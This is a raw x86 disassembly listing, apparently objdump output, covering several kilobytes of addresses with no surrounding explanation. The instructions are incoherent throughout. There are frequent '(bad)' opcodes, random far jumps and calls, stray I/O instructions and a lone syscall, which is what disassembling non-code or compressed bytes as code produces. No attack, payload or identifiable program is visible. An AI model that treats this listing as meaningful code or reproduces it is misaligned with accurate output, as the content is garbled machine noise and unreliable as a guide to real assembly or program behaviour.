  41f3e6:	pop    esi
  41f3e7:	sbb    BYTE PTR ds:0xbcaae17,cl
  41f3ed:	mov    al,ds:0x6f1dfdf0
  41f3f2:	push   edx
  41f3f3:	js     0x41f422
  41f3f5:	jno    0x41f418
  41f3f7:	xchg   ebx,eax
  41f3f8:	sub    DWORD PTR [eax],ebp
  41f3fa:	pop    esi
  41f3fb:	pop    ds
  41f3fc:	je     0x41f424
  41f3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3ff:	push   ds
  41f400:	and    dl,dl
  41f402:	xchg   ebx,eax
  41f403:	repz out 0xf0,eax
  41f406:	sub    BYTE PTR [eax+0x61],0x16
  41f40a:	adc    DWORD PTR [ecx+0x10],edi
  41f40d:	pop    ecx
  41f40e:	les    edx,FWORD PTR [ebp-0x38]
  41f411:	or     al,0x5b
  41f413:	xchg   ecx,eax
  41f414:	into   
  41f415:	sbb    eax,esi
  41f417:	es out 0x1,al
  41f41a:	inc    ecx
  41f41b:	mov    ecx,0xeba0e3c1
  41f420:	loop   0x41f41f
  41f422:	inc    esi
  41f423:	inc    eax
  41f424:	mov    bl,0xd9
  41f426:	pop    ss
  41f427:	adc    al,0xa3
  41f429:	add    DWORD PTR ds:0x7e50fba2,ecx
  41f42f:	shr    BYTE PTR [edx-0x34],1
  41f432:	in     eax,dx
  41f433:	xor    ch,bh
  41f435:	pushf  
  41f436:	and    dh,BYTE PTR [esi+0xd]
  41f439:	add    edi,esi
  41f43b:	sbb    DWORD PTR [edx+ebp*2+0x8c85e2c],ecx
  41f442:	mov    ?,ebx
  41f444:	inc    ebx
  41f445:	pop    es
  41f446:	(bad)  
  41f447:	rol    DWORD PTR [ebx+0x3ae41b],cl
  41f44d:	outs   dx,BYTE PTR ds:[esi]
  41f44e:	pop    ebx
  41f44f:	in     al,dx
	...
  41f458:	add    BYTE PTR [eax],al
  41f45a:	add    BYTE PTR [esi],dh
  41f45c:	arpl   WORD PTR [eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	(bad)  
  41f468:	retf   0xb9c7
  41f46b:	out    0x95,eax
  41f46d:	add    DWORD PTR [eax],eax
  41f46f:	lods   eax,DWORD PTR ds:[esi]
  41f470:	add    BYTE PTR [eax],al
  41f472:	add    bl,dh
  41f474:	cmp    edx,esp
  41f476:	and    dh,dl
  41f478:	les    edx,FWORD PTR [ebx]
  41f47a:	(bad)  
  41f47b:	sub    al,0xb2
  41f47d:	jb     0x41f4a9
  41f47f:	dec    ebx
  41f480:	inc    eax
  41f481:	mov    esp,0x5f898e39
  41f486:	adc    dl,BYTE PTR [esi+ebp*2+0x13973699]
  41f48d:	jmp    0x1016:0x1c30b273
  41f494:	je     0x41f418
  41f496:	(bad)  
  41f497:	push   ss
  41f498:	(bad)  
  41f499:	pop    esp
  41f49a:	and    al,0x34
  41f49c:	pop    es
  41f49d:	ror    DWORD PTR [edi-0x9],0x35
  41f4a1:	adc    al,0x74
  41f4a3:	mov    ecx,0xf29dabde
  41f4a8:	in     al,dx
  41f4a9:	std    
  41f4aa:	cmp    al,0x1e
  41f4ac:	je     0x41f4fa
  41f4ae:	mov    ds:0x100bdef1,eax
  41f4b3:	mov    esp,0x929af22b
  41f4b8:	(bad)  
  41f4b9:	dec    edx
  41f4ba:	imul   esi,DWORD PTR gs:[eax-0x731938fb],0x4ac5080a
  41f4c5:	mov    cl,0x5a
  41f4c7:	mov    ch,dl
  41f4c9:	and    eax,0xb6699e77
  41f4ce:	mul    DWORD PTR [ebp-0x51]
  41f4d1:	(bad)  
  41f4d2:	xlat   BYTE PTR ds:[ebx]
  41f4d3:	sbb    BYTE PTR [esi+0x7347951d],dh
  41f4d9:	leave  
  41f4da:	xchg   edi,eax
  41f4db:	dec    ebp
  41f4dc:	ins    BYTE PTR es:[edi],dx
  41f4dd:	mov    DWORD PTR [ebp+ebp*2+0x3a],ebp
  41f4e1:	jae    0x41f4fe
  41f4e3:	cdq    
  41f4e4:	pop    eax
  41f4e5:	nop
  41f4e6:	scas   eax,DWORD PTR es:[edi]
  41f4e7:	out    dx,al
  41f4e8:	inc    edi
  41f4e9:	xor    ah,BYTE PTR [edx+0x6e]
  41f4ec:	dec    edx
  41f4ed:	in     eax,dx
  41f4ee:	rcl    BYTE PTR [esp+edi*1+0x376ad883],1
  41f4f5:	inc    eax
  41f4f6:	adc    eax,0x34c8efa6
  41f4fb:	inc    esi
  41f4fc:	cs push 0xaabdc83d
  41f502:	and    BYTE PTR ds:0x22cd0b29,0x93
  41f509:	xor    al,0x65
  41f50b:	out    dx,eax
  41f50c:	mov    DWORD PTR [esi+0x6d7ae68a],esi
  41f512:	outs   dx,BYTE PTR ds:[esi]
  41f513:	arpl   WORD PTR [ebp+0x41],bx
  41f516:	jge    0x41f508
  41f518:	mov    al,ds:0x78aa107d
  41f51d:	inc    esi
  41f51e:	mov    ecx,0xd
	...
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0x2032075b
  41f539:	(bad)  
  41f53a:	cld    
  41f53b:	imul   esp,DWORD PTR [ebx+0xad0001],0x0
  41f542:	add    BYTE PTR [eax-0x483dd9fc],dh
  41f548:	lods   eax,DWORD PTR ds:[esi]
  41f549:	stc    
  41f54a:	inc    esp
  41f54b:	sti    
  41f54c:	or     DWORD PTR [ebx-0x1a],ecx
  41f54f:	js     0x41f581
  41f551:	jp     0x41f506
  41f553:	mov    al,BYTE PTR [edi+0x40]
  41f556:	retf   
  41f557:	aam    0xe3
  41f559:	pop    eax
  41f55a:	out    dx,al
  41f55b:	aaa    
  41f55c:	inc    ebx
  41f55d:	test   DWORD PTR [esi+0x66f1189],esi
  41f563:	pusha  
  41f564:	jl     0x41f5cf
  41f566:	jae    0x41f518
  41f568:	dec    edx
  41f569:	jo     0x41f5e7
  41f56b:	test   DWORD PTR [edi+0x3710365a],edi
  41f571:	fistp  DWORD PTR [edx+0x49]
  41f574:	dec    edi
  41f575:	mov    ch,0xd8
  41f577:	test   eax,0xe7bce573
  41f57c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f57d:	cdq    
  41f57e:	je     0x41f578
  41f580:	int3   
  41f581:	pusha  
  41f582:	icebp  
  41f583:	ss (bad) 
  41f586:	add    dl,cl
  41f588:	lahf   
  41f589:	push   ebp
  41f58a:	and    BYTE PTR [ebx-0x4780e65],dl
  41f590:	pop    ds
  41f591:	mov    dh,0xac
  41f594:	shl    BYTE PTR [eax+0x22773947],1
  41f59a:	arpl   WORD PTR [edx+0x7852b5de],sp
  41f5a0:	push   cs
  41f5a1:	xchg   esi,eax
  41f5a2:	or     BYTE PTR [ebx-0x2ef3549b],dl
  41f5a8:	and    al,0xe0
  41f5aa:	fxch   st(6)
  41f5ac:	lock (bad) 
  41f5ae:	es es std 
  41f5b1:	out    0x41,eax
  41f5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b4:	push   edi
  41f5b5:	push   0x44
  41f5b7:	mov    bl,0x1d
  41f5b9:	mov    bh,0x3c
  41f5bb:	inc    edx
  41f5bc:	cdq    
  41f5bd:	adc    esp,edi
  41f5bf:	push   ebx
  41f5c0:	jp     0x41f59b
  41f5c2:	and    eax,DWORD PTR [eax-0x3a8c9d2b]
  41f5c8:	xor    edx,ecx
  41f5ca:	jge    0x41f56c
  41f5cc:	sub    al,0xd
  41f5ce:	call   0x1709:0x6e1d8349
  41f5d5:	push   es
  41f5d6:	xchg   DWORD PTR [ecx-0x4b6361fc],eax
  41f5dc:	inc    esp
  41f5dd:	stc    
  41f5de:	push   esp
  41f5df:	cwde   
  41f5e0:	cmp    BYTE PTR [ebp+0x38],bh
  41f5e3:	adc    dh,BYTE PTR [esi+0x6fd7653c]
  41f5e9:	sbb    eax,DWORD PTR [esp+ebx*1]
  41f5ec:	fcmovnbe st,st(5)
  41f5ee:	dec    edi
  41f5ef:	mov    BYTE PTR [eax],0x0
	...
  41f5fa:	add    BYTE PTR [edi],dh
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0xba66:0xc897eef4
  41f60b:	sbb    BYTE PTR [ecx+eax*1+0xad00],ah
  41f612:	add    bl,al
  41f614:	fstp   DWORD PTR [edi+ebx*1+0x33]
  41f618:	xchg   esi,eax
  41f619:	mov    al,dh
  41f61b:	in     eax,0xf7
  41f61d:	addr16 adc al,0xd2
  41f620:	or     eax,0x6bff0f6
  41f625:	inc    ecx
  41f626:	push   0x54b71d53
  41f62b:	retf   0xb477
  41f62e:	iret   
  41f62f:	pop    edi
  41f630:	loope  0x41f631
  41f632:	pop    esp
  41f633:	imul   edi,DWORD PTR [esi],0x52
  41f636:	jmp    0x57b4:0x3b730c98
  41f63d:	ret    0x823
  41f640:	adc    ecx,edx
  41f642:	xor    DWORD PTR [ebp+0x52de671c],eax
  41f648:	add    al,0x76
  41f64a:	rol    DWORD PTR [ecx],1
  41f64c:	outs   dx,DWORD PTR ds:[esi]
  41f64d:	lahf   
  41f64e:	leave  
  41f64f:	cdq    
  41f650:	pop    ss
  41f651:	call   0x89c62ecc
  41f656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f657:	popf   
  41f658:	inc    ecx
  41f659:	mov    esp,0x1dad661c
  41f65e:	(bad)  
  41f660:	les    esp,FWORD PTR [esi+ebx*4-0x37]
  41f664:	test   eax,0x5b00019e
  41f669:	push   ss
  41f66a:	popf   
  41f66b:	xchg   ecx,eax
  41f66c:	arpl   WORD PTR [edi],bp
  41f66e:	aas    
  41f66f:	push   esi
  41f670:	pop    es
  41f671:	sub    edi,DWORD PTR [edi+0x65]
  41f674:	add    bl,BYTE PTR [edx+0x55cd97aa]
  41f67a:	fst    st(2)
  41f67c:	xor    esi,DWORD PTR [esi+0x10]
  41f67f:	push   ecx
  41f680:	lods   eax,DWORD PTR ds:[esi]
  41f681:	imul   ebp,DWORD PTR [ecx],0x37fe86d9
  41f687:	and    edi,ebx
  41f689:	push   ss
  41f68a:	jo     0x41f6a8
  41f68c:	pop    es
  41f68d:	mov    bh,0xec
  41f68f:	mov    ch,0x24
  41f691:	cmp    DWORD PTR [ebp-0x121cc13a],ebp
  41f697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f698:	or     al,0x8d
  41f69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f69b:	fcmovnbe st,st(7)
  41f69d:	mov    edx,0x9afa163d
  41f6a2:	mov    esp,0x4507c37c
  41f6a7:	inc    eax
  41f6a8:	shr    BYTE PTR [ecx+0x1b764422],0x1b
  41f6af:	neg    DWORD PTR [ebx+0xaa66bb0]
  41f6b5:	fwait
  41f6b6:	dec    esi
  41f6b7:	(bad)  
  41f6b8:	sbb    DWORD PTR [esi+0x71188899],esi
  41f6be:	addr16 pop es
	...
  41f6c8:	add    BYTE PTR [eax],al
  41f6ca:	add    BYTE PTR [esi],dl
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x586e5f3a],al
  41f6d9:	jecxz  0x41f6dd
  41f6db:	lds    esp,FWORD PTR [ecx+eax*1+0xad00]
  41f6e2:	add    BYTE PTR [edx-0x69],ah
  41f6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e6:	lods   al,BYTE PTR ds:[esi]
  41f6e7:	retf   
  41f6e8:	mov    esi,0xc382856b
  41f6ed:	and    ecx,DWORD PTR [ecx]
  41f6ef:	icebp  
  41f6f0:	push   cs
  41f6f1:	mov    ah,0x91
  41f6f3:	cmp    eax,ecx
  41f6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f6:	xlat   BYTE PTR ds:[ebx]
  41f6f7:	sti    
  41f6f8:	pop    DWORD PTR [edx+0x4e]
  41f6fb:	xchg   BYTE PTR [ebx-0x55],ah
  41f6fe:	retf   0x1fd8
  41f701:	or     DWORD PTR [ebx-0x106918e1],edx
  41f707:	pop    ebx
  41f708:	push   ecx
  41f709:	push   es
  41f70a:	rcl    DWORD PTR [ebx],1
  41f70c:	shr    DWORD PTR [edi+0x4c077e6c],1
  41f712:	mov    al,ds:0xc84d9aa8
  41f717:	stos   DWORD PTR es:[edi],eax
  41f718:	test   eax,0x2ffab7ca
  41f71d:	ins    DWORD PTR es:[edi],dx
  41f71e:	push   0x1e
  41f720:	jnp    0x41f6e7
  41f722:	mov    bl,0x80
  41f724:	adc    bh,al
  41f726:	mov    ds:0x2df218c9,eax
  41f72b:	int    0x5b
  41f72d:	xchg   ebx,eax
  41f72e:	fldenv [esi]
  41f730:	or     ebp,ecx
  41f732:	aas    
  41f733:	test   DWORD PTR [esi-0x54],0xf4af85c6
  41f73a:	mov    ebx,cs
  41f73c:	test   al,0xe
  41f73e:	clc    
  41f73f:	mov    ah,0x30
  41f741:	out    dx,al
  41f742:	mov    ecx,0xc1c2b5e2
  41f747:	(bad)  
  41f748:	jno    0x41f7aa
  41f74a:	js     0x41f784
  41f74c:	enter  0xb11b,0x13
  41f750:	push   cs
  41f751:	loopne 0x41f6d3
  41f753:	retf   0xb5c3
  41f756:	gs mov bh,0x40
  41f759:	adc    edi,edi
  41f75b:	xchg   DWORD PTR [eax+0x2f],ecx
  41f75e:	js     0x41f7dc
  41f760:	test   DWORD PTR [ecx],0xd27e793b
  41f766:	jl     0x41f72d
  41f768:	out    dx,al
  41f769:	push   ds
  41f76a:	test   al,0x9c
  41f76c:	push   esi
  41f76d:	retf   
  41f76e:	mov    al,0xc
  41f770:	or     BYTE PTR [ebp+0x63b9e4f9],0xe4
  41f777:	sbb    BYTE PTR [ebx-0x4d8a3afa],dl
  41f77d:	cmp    DWORD PTR ds:0xc43d0074,eax
  41f783:	pop    esp
  41f784:	inc    edi
  41f785:	mov    edi,0xbcead048
  41f78a:	out    dx,eax
  41f78b:	into   
  41f78c:	jb     0x41f7a1
  41f78e:	retf   
  41f78f:	push   esp
	...
  41f798:	add    BYTE PTR [eax],al
  41f79a:	add    BYTE PTR [esi+0x76],ch
  41f79d:	in     al,0xca
  41f79f:	cld    
  41f7a0:	fisubr DWORD PTR [esi-0xa]
  41f7a3:	sbb    BYTE PTR [edx+0x4a419787],dl
  41f7a9:	mov    esi,0x1a572b8
  41f7ae:	add    BYTE PTR [ebp-0x75000000],ch
  41f7b4:	shr    DWORD PTR [edi+ecx*4],0x2c
  41f7b8:	ins    BYTE PTR es:[edi],dx
  41f7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ba:	xor    esp,edx
  41f7bc:	ins    DWORD PTR es:[edi],dx
  41f7bd:	adc    al,BYTE PTR [ecx+0x1e]
  41f7c0:	sub    DWORD PTR [esi+eax*1-0x27a407e7],esi
  41f7c7:	xor    al,dh
  41f7c9:	inc    ecx
  41f7ca:	fsubr  DWORD PTR [ebx-0x57b248c9]
  41f7d0:	pushf  
  41f7d1:	loop   0x41f80c
  41f7d3:	test   al,0xca
  41f7d5:	xchg   BYTE PTR [ebx],bh
  41f7d7:	jmp    0xcfc4:0x7d5c18d8
  41f7de:	test   cl,cl
  41f7e0:	and    DWORD PTR [eax+0x65],ebx
  41f7e3:	push   edx
  41f7e4:	add    eax,0xa7560e31
  41f7e9:	jl     0x41f796
  41f7eb:	pop    ebp
  41f7ec:	(bad)  
  41f7ed:	rol    DWORD PTR [ecx],1
  41f7ef:	mov    ch,0xc3
  41f7f1:	and    eax,0xd2496c46
  41f7f6:	aaa    
  41f7f7:	je     0x41f7f5
  41f7f9:	aas    
  41f7fa:	sub    edi,DWORD PTR [esi-0x1a]
  41f7fd:	jmp    0x789cf034
  41f802:	sub    al,0xc
  41f804:	pop    es
  41f805:	xchg   edx,eax
  41f806:	sbb    ebp,ebx
  41f808:	das    
  41f809:	retf   
  41f80a:	iret   
  41f80b:	pop    ebx
  41f80c:	mov    ch,0xdd
  41f80e:	sbb    edx,esp
  41f810:	stos   BYTE PTR es:[edi],al
  41f811:	leave  
  41f812:	fwait
  41f813:	dec    esp
  41f814:	push   edi
  41f815:	or     BYTE PTR [ebx],0xc8
  41f818:	pop    ecx
  41f819:	dec    edx
  41f81a:	cwde   
  41f81b:	out    0x31,eax
  41f81d:	mov    ebp,DWORD PTR [edx+edx*2+0x28]
  41f821:	or     edx,DWORD PTR [ebp-0x7a]
  41f824:	in     eax,dx
  41f825:	fidiv  DWORD PTR [esi-0x23]
  41f828:	nop
  41f829:	sbb    eax,0xfdfa94b7
  41f82e:	cdq    
  41f82f:	mov    edi,0xd51059a8
  41f834:	fbld   TBYTE PTR ds:0x8a3279ef
  41f83a:	push   0xffffffaf
  41f83c:	mov    BYTE PTR ds:0x99be4344,ch
  41f842:	and    cl,cl
  41f844:	push   0x3a
  41f846:	call   0xda9e275c
  41f84b:	pop    ecx
  41f84c:	sbb    eax,0x8a0897a6
  41f851:	mov    ds:0xbf2ed8ba,eax
  41f856:	(bad)
  41f85a:	push   es
  41f85b:	(bad)  
  41f85c:	sahf   
  41f85d:	lods   al,BYTE PTR ds:[esi]
  41f85e:	sub    al,bl
	...
  41f868:	add    BYTE PTR [eax],al
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax+0x68462d3],1
  41f87a:	mov    ds:0x1a61f,al
  41f87f:	lods   eax,DWORD PTR ds:[esi]
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [ebx],bh
  41f884:	mov    BYTE PTR [ebx-0x433afc6c],dl
  41f88a:	xor    DWORD PTR [esi+0x5cf66be4],esp
  41f890:	mov    WORD PTR [ecx+0x31],?
  41f893:	push   ecx
  41f894:	inc    ebx
  41f895:	mov    BYTE PTR [esi+edi*2+0x2b8ead12],dl
  41f89c:	cli    
  41f89d:	mov    eax,0xfba345a3
  41f8a2:	dec    edx
  41f8a3:	jle    0x41f8f0
  41f8a5:	and    eax,0x2693b81d
  41f8aa:	inc    eax
  41f8ab:	mov    esi,0x2701f1f6
  41f8b0:	xor    eax,0x59cb349f
  41f8b5:	push   eax
  41f8b6:	popf   
  41f8b7:	jo     0x41f8ee
  41f8b9:	mov    eax,ds:0x70f88c97
  41f8be:	mov    esi,0x3dd72c4a
  41f8c3:	loop   0x41f852
  41f8c5:	mov    edi,0xca7f2d8c
  41f8ca:	inc    ebp
  41f8cb:	aam    0xc5
  41f8cd:	lea    ecx,[edi]
  41f8cf:	cmp    cl,BYTE PTR [ebp-0x50cdcebc]
  41f8d5:	rcl    dh,cl
  41f8d7:	neg    bh
  41f8d9:	sti    
  41f8da:	jno    0x41f876
  41f8dc:	jp     0x41f87c
  41f8de:	inc    dl
  41f8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8e1:	stos   BYTE PTR es:[edi],al
  41f8e2:	int    0xa0
  41f8e4:	sti    
  41f8e5:	std    
  41f8e6:	push   0xac6e47f0
  41f8eb:	(bad)  
  41f8ec:	jno    0x41f8e1
  41f8ee:	fs dec eax
  41f8f0:	xchg   ebp,eax
  41f8f1:	fmul   QWORD PTR [esi]
  41f8f3:	xchg   esi,ecx
  41f8f5:	sar    BYTE PTR [ebp+0x58],1
  41f8f8:	fild   DWORD PTR [edx-0x3d]
  41f8fb:	leave  
  41f8fc:	sbb    dh,BYTE PTR [ecx-0xaca92b]
  41f902:	or     eax,0xcbef36b9
  41f907:	add    DWORD PTR [esp+edx*4],0xbc4dc484
  41f90e:	js     0x41f8d1
  41f910:	jmp    0x41f8b6
  41f912:	test   al,0xd7
  41f914:	fstp   QWORD PTR ds:0x854f
  41f919:	pop    ebx
  41f91a:	pusha  
  41f91b:	xchg   edi,eax
  41f91c:	inc    edi
  41f91d:	push   edx
  41f91e:	pop    ds
  41f91f:	inc    ecx
  41f920:	inc    esi
  41f921:	bound  esi,QWORD PTR [edx-0x19]
  41f924:	and    bl,BYTE PTR [ecx+edx*8-0x3308bfab]
  41f92b:	mov    ah,0x6c
  41f92d:	sub    DWORD PTR [ecx-0x55],esp
	...
  41f938:	add    BYTE PTR [eax],al
  41f93a:	add    BYTE PTR [ebx-0x4293427d],dl
  41f940:	jle    0x41f915
  41f942:	call   DWORD PTR [eax-0x20]
  41f945:	cli    
  41f946:	call   0xa6cc:0x38409a79
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	lods   eax,DWORD PTR ds:[esi]
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    BYTE PTR [eax-0x23],ah
  41f955:	jle    0x41f9ca
  41f957:	outs   dx,DWORD PTR ds:[esi]
  41f958:	xor    BYTE PTR [ebx],dh
  41f95a:	sbb    eax,ebx
  41f95c:	cs mov edx,0x6a8f2f2
  41f962:	inc    edi
  41f963:	or     eax,0xef12b4e8
  41f968:	xor    BYTE PTR ds:0xe82de43,bl
  41f96e:	push   esi
  41f96f:	nop
  41f970:	xchg   esp,eax
  41f971:	cmp    al,0xfa
  41f973:	in     eax,dx
  41f974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f975:	jo     0x41f9cc
  41f977:	repz adc ecx,edx
  41f97a:	mov    ds:0x6e7f84e3,al
  41f97f:	hlt    
  41f980:	push   ebx
  41f981:	push   es
  41f982:	ds ret 
  41f984:	sbb    dh,BYTE PTR [edi]
  41f986:	or     al,0x7a
  41f988:	(bad)  
  41f989:	mov    ah,BYTE PTR [ebx-0x42]
  41f98c:	out    0x2e,al
  41f98e:	fwait
  41f98f:	add    DWORD PTR [edx],esp
  41f991:	es scas al,BYTE PTR es:[edi]
  41f993:	xchg   edi,eax
  41f994:	ror    eax,0xe
  41f997:	retf   0x8311
  41f99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99b:	and    DWORD PTR [ecx+0x5d381500],0xf241c345
  41f9a5:	sub    al,0x5a
  41f9a7:	adc    al,0x64
  41f9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9aa:	jb     0x41fa27
  41f9ac:	scas   al,BYTE PTR es:[edi]
  41f9ad:	lods   eax,DWORD PTR ds:[esi]
  41f9ae:	call   0x7031:0xebd5be8c
  41f9b5:	xor    DWORD PTR [ecx],edi
  41f9b7:	mov    edi,0x6ba61f94
  41f9bc:	mov    DWORD PTR [edx-0x47],esp
  41f9bf:	shl    DWORD PTR [eax+0xe],1
  41f9c2:	jne    0x41fa21
  41f9c4:	sbb    BYTE PTR [esi+ecx*1],ah
  41f9c7:	push   ds
  41f9c8:	jg     0x41fa38
  41f9ca:	test   al,0xba
  41f9cc:	and    ebp,ecx
  41f9ce:	push   edi
  41f9cf:	xchg   edi,eax
  41f9d0:	es jo  0x41f97a
  41f9d3:	adc    ecx,edx
  41f9d5:	stos   BYTE PTR es:[edi],al
  41f9d6:	fsub   QWORD PTR [esi-0x42c3a7c9]
  41f9dc:	retf   
  41f9dd:	test   BYTE PTR [ebp-0x23],0xc2
  41f9e1:	jno    0x41fa0e
  41f9e3:	bnd call 0xc72b40e9
  41f9e9:	ds inc esi
  41f9eb:	jg     0x41f9ed
  41f9ed:	leave  
  41f9ee:	imul   eax,edx,0x489f1d1e
  41f9f4:	or     dl,ch
  41f9f6:	mov    bh,0x32
  41f9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9f9:	clc    
  41f9fa:	pop    ss
  41f9fb:	out    0x67,eax
  41f9fd:	nop
  41f9fe:	(bad)  
  41f9ff:	cwde   
	...
  41fa08:	add    BYTE PTR [eax],al
  41fa0a:	add    ah,bl
  41fa0c:	fincstp 
  41fa0e:	shl    bh,0xee
  41fa11:	(bad)  
  41fa12:	frstor [ecx+eax*1]
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	das    
  41fa18:	(bad)  
  41fa19:	in     al,0xe6
  41fa1b:	jns    0x41f9c4
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	lods   eax,DWORD PTR ds:[esi]
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    bh,dl
  41fa24:	mov    ch,0x37
  41fa26:	sub    cl,BYTE PTR [eax+edi*2]
  41fa29:	push   ecx
  41fa2a:	mov    dl,ch
  41fa2c:	and    BYTE PTR [edi],0xe6
  41fa2f:	(bad)  
  41fa30:	ss mov ch,0xf9
  41fa33:	lods   eax,DWORD PTR ds:[esi]
  41fa34:	add    BYTE PTR [esi-0x4fdb1f52],ch
  41fa3a:	sub    dh,bh
  41fa3c:	fwait
  41fa3d:	xchg   esi,eax
  41fa3e:	xor    ebx,DWORD PTR [ebx+0x40]
  41fa41:	outs   dx,BYTE PTR ds:[esi]
  41fa42:	jns    0x41fab3
  41fa44:	xor    BYTE PTR [edx],ch
  41fa46:	stos   DWORD PTR es:[edi],eax
  41fa47:	fucomip st,st(1)
  41fa49:	rcl    DWORD PTR [ebp+0x1ca39ac7],0x29
  41fa50:	inc    eax
  41fa51:	ins    BYTE PTR es:[edi],dx
  41fa52:	cmp    DWORD PTR [esi],ecx
  41fa54:	ins    BYTE PTR es:[edi],dx
  41fa55:	xlat   BYTE PTR ds:[ebx]
  41fa56:	xchg   BYTE PTR [ebx+0x26],bl
  41fa59:	push   esi
  41fa5a:	fnsave [ebx+0x1a]
  41fa5d:	mov    ebp,0xfa68f950
  41fa62:	jo     0x41fa75
  41fa64:	push   eax
  41fa65:	xlat   BYTE PTR ds:[ebx]
  41fa66:	adc    cl,bh
  41fa68:	fcmovbe st,st(6)
  41fa6a:	xor    eax,0x4a73aae4
  41fa6f:	sahf   
  41fa70:	mov    WORD PTR [esi],gs
  41fa72:	test   BYTE PTR [ecx],al
  41fa74:	pop    edi
  41fa75:	mov    ebp,0xa855229d
  41fa7a:	rcl    DWORD PTR [ebx],1
  41fa7c:	cmp    edi,DWORD PTR [eax]
  41fa7e:	pop    eax
  41fa7f:	test   DWORD PTR ds:0xaff54d4,edi
  41fa85:	inc    ecx
  41fa86:	push   edx
  41fa87:	jne    0x41fadc
  41fa89:	fdivp  st(3),st
  41fa8b:	pop    es
  41fa8c:	cmp    BYTE PTR [edx],ah
  41fa8e:	pop    es
  41fa8f:	fs xchg edi,eax
  41fa91:	xchg   edx,eax
  41fa93:	cmc    
  41fa94:	pop    edi
  41fa95:	shl    edi,cl
  41fa97:	mov    dl,0xa2
  41fa99:	mov    al,0x4e
  41fa9b:	jo     0x41fb10
  41fa9d:	or     eax,0x46302284
  41faa2:	ror    bl,cl
  41faa4:	mov    gs,edi
  41faa6:	ins    DWORD PTR es:[edi],dx
  41faa7:	xor    bh,BYTE PTR [esi+edi*2+0x540a9e9]
  41faae:	data16 into 
  41fab0:	jge    0x41facc
  41fab2:	mov    bh,0x76
  41fab4:	je     0x41fa48
  41fab6:	syscall 
  41fab8:	and    DWORD PTR [esi-0x55],ebx
  41fabb:	adc    BYTE PTR [ebx-0x6d],bh
  41fabe:	and    al,BYTE PTR [esi]
  41fac0:	je     0x41fb19
  41fac2:	sbb    bl,bh
  41fac4:	mov    dh,BYTE PTR [esi-0x74]
  41fac7:	int    0xe8
  41fac9:	or     DWORD PTR [ecx-0x49],ecx
  41facc:	jb     0x41facf
  41face:	push   edi
  41facf:	out    0x0,eax
	...
  41fad9:	add    BYTE PTR [eax],al
  41fadb:	outs   dx,DWORD PTR ds:[esi]
  41fadc:	mov    ds:0x7edd2ad4,al
  41fae1:	jmp    edi
  41fae3:	push   edx
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0xf0
  41fae8:	inc    esi
  41fae9:	jmp    0x41fb25
  41faeb:	es test al,0x1
  41faee:	add    BYTE PTR [ebp-0x5c000000],ch
  41faf4:	jo     0x41fa8d
  41faf6:	outs   dx,DWORD PTR ds:[esi]
  41faf7:	clc    
  41faf8:	cmp    ebp,DWORD PTR [esi]
  41fafa:	pop    ecx
  41fafb:	cld    
  41fafc:	jmp    0x41fa8a
  41fafe:	daa    
  41faff:	out    dx,al
  41fb00:	ins    DWORD PTR es:[edi],dx
  41fb01:	(bad)  [eax+0x4e]
  41fb04:	push   ebp
  41fb05:	sub    ebp,DWORD PTR [edi-0x54]
  41fb08:	icebp  
  41fb09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb0a:	mov    ax,0xa414
  41fb0e:	imul   edi,DWORD PTR [eax-0x5a8f32c9],0x5
  41fb15:	add    BYTE PTR [ebp+0x51],cl
  41fb18:	add    DWORD PTR [edi+0x49b42f68],esi
  41fb1e:	retf   0x1371
  41fb21:	loope  0x41fab5
  41fb23:	aad    0x95
  41fb25:	adc    ebx,DWORD PTR [edi+0x5b]
  41fb28:	js     0x41fb08
  41fb2a:	and    BYTE PTR [ebx],bl
  41fb2c:	jmp    0x8f8d:0x379a1fd4
  41fb33:	mov    bl,0xbb
  41fb35:	xor    al,0x9f
  41fb37:	push   DWORD PTR [esi+0x5a]
  41fb3a:	cld    
  41fb3b:	dec    esp
  41fb3c:	in     eax,dx
  41fb3d:	mov    ch,0x76
  41fb3f:	jbe    0x41fb94
  41fb41:	daa    
  41fb42:	fcmovnb st,st(3)
  41fb44:	dec    esp
  41fb45:	in     al,dx
  41fb46:	outs   dx,DWORD PTR ds:[esi]
  41fb47:	pusha  
  41fb48:	inc    BYTE PTR [edi-0x6e]
  41fb4b:	xchg   esi,ecx
  41fb4d:	sub    DWORD PTR [edi-0x75],0xa29b4852
  41fb54:	dec    esi
